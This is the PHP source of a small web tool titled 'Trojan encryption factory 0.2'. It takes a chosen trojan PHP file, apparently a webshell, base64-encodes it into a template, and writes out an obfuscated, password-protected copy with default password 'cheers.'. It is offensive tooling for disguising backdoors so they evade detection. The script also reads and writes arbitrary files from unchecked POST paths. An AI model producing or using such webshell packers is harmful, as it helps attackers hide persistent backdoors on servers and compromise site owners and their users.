<?php $title = '木马加密工厂0.2';?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>
<?php $title;?>
</title>
</head>

<body>
<?php
$trojanFile = '';
$templateFile = '';

if(!empty($_POST)){
	echo '<h1>'.$title.'</h1>';
	$trojanFile = $_POST['trojanFile'];
	$templateFile = $_POST['templateFile'];
	
	$targetTrojanFile = basename($trojanFile);
	
	file_put_contents($targetTrojanFile, str_replace('MuBanBuYaoDong', base64_encode('?>'.file_get_contents($trojanFile)), file_get_contents($templateFile)));
	
	echo '<h2>木马加密成功！</h2><br />';
	echo '<p>木马加密后位置：<a href="'.$targetTrojanFile.'" target="_blank">'.$targetTrojanFile.'</a>, 默认密码：<b>cheers.</b><p>';
	echo '<p>本次木马加密使用模板：'.$templateFile.'<p>';
}
?>
<form id="trojanForm" name="trojanForm" method="post">
  <select name="trojanFile" id="trojanFile">
    <?php
foreach(glob('trojan/*.php') as $v){
	echo '<option value="'.$v.'"'.($v === $trojanFile ? ' selected' : '').'>'.basename($v).'</option>';
}
?>
  </select>
  <select name="templateFile" id="templateFile">
    <?php
foreach(glob('template/*.php') as $v){
	echo '<option value="'.$v.'"'.($v === $templateFile ? ' selected' : '').'>'.basename($v).'</option>';
}
?>
  </select>
  <input type="submit" name="submit" id="submit" value="加密木马，默认密码为：1">
</form>
</body>
</html>